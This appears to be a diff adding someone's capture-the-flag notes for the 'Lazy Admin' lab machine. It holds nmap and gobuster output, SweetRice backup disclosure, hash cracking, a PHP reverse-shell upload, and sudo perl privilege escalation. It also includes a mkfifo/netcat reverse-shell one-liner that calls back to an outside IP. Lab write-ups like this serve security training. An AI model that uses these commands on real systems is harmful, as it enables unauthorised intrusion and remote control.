@@ -1,0 +1,80 @@
+lazy admin
+
+port scanning: nmap -sC -sV 10.10.78.236 -v
+	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
+	|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
+	|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+directory scanning: gobuster dir -u http://10.10.78.236 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+	┌──(kishore㉿kali)-[~]
+	└─$ gobuster dir -u http://10.10.78.236 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+	===============================================================
+	Gobuster v3.5
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+	===============================================================
+	[+] Url:                     http://10.10.78.236
+	[+] Method:                  GET
+	[+] Threads:                 10
+	[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+	[+] Negative Status codes:   404
+	[+] User Agent:              gobuster/3.5
+	[+] Timeout:                 10s
+	===============================================================
+	2023/09/30 23:36:07 Starting gobuster in directory enumeration mode
+	===============================================================
+	/content              (Status: 301) [Size: 314] [--> http://10.10.78.236/content/]
+	Progress: 4203 / 220561 (1.91%)[ERROR] 2023/09/30 23:37:44 [!] Get "http://10.10.78.236/builder": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+	[ERROR] 2023/09/30 23:37:44 [!] Get "http://10.10.78.236/658": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+	[ERROR] 2023/09/30 23:37:44 [!] Get "http://10.10.78.236/white-papers": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+	Progress: 7532 / 220561 (3.41%)^C
+	[!] Keyboard interrupt detected, terminating.
+
+	===============================================================
+	2023/09/30 23:38:50 Finished
+	===============================================================
+	                                                                                                                                                                       
+	┌──(kishore㉿kali)-[~]
+	└─$ gobuster dir -u http://10.10.78.236/content -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+	===============================================================
+	Gobuster v3.5
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+	===============================================================
+	[+] Url:                     http://10.10.78.236/content
+	[+] Method:                  GET
+	[+] Threads:                 10
+	[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+	[+] Negative Status codes:   404
+	[+] User Agent:              gobuster/3.5
+	[+] Timeout:                 10s
+	===============================================================
+	2023/09/30 23:38:58 Starting gobuster in directory enumeration mode
+	===============================================================
+	/images               (Status: 301) [Size: 321] [--> http://10.10.78.236/content/images/]
+	/js                   (Status: 301) [Size: 317] [--> http://10.10.78.236/content/js/]
+	/inc                  (Status: 301) [Size: 318] [--> http://10.10.78.236/content/inc/]
+	/as                   (Status: 301) [Size: 317] [--> http://10.10.78.236/content/as/]
+	/_themes              (Status: 301) [Size: 322] [--> http://10.10.78.236/content/_themes/]
+	/attachment           (Status: 301) [Size: 325] [--> http://10.10.78.236/content/attachment/]
+	Progress: 6221 / 220561 (2.82%)^C
+	[!] Keyboard interrupt detected, terminating.
+
+* searchsploit sweetrice -> exploit for backup disclosure
+* /content/inc/mysql_backup/ found sql file download and open it found user: mana*** password: hash -> crack it via crackstation found password
+* /content/as -> username and password access
+* media center -> upload php reverse shell but php extension not support due to security i guess try with php5
+* got nc -lvnp 4444 got access
+* python -c 'import pty;pty.spawn("/bin/bash")'
+* user.txt found
+
+Root:
+	* backup.pl
+	* cat backup.pl
+		/etc/copy.sh
+		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.20.224 12345 >/tmp/f" > copy.sh
+	* sudo /usr/bin/perl backup.pl , nc -lvnp 12345 (host machine)
+	* got access
+	* found root flag
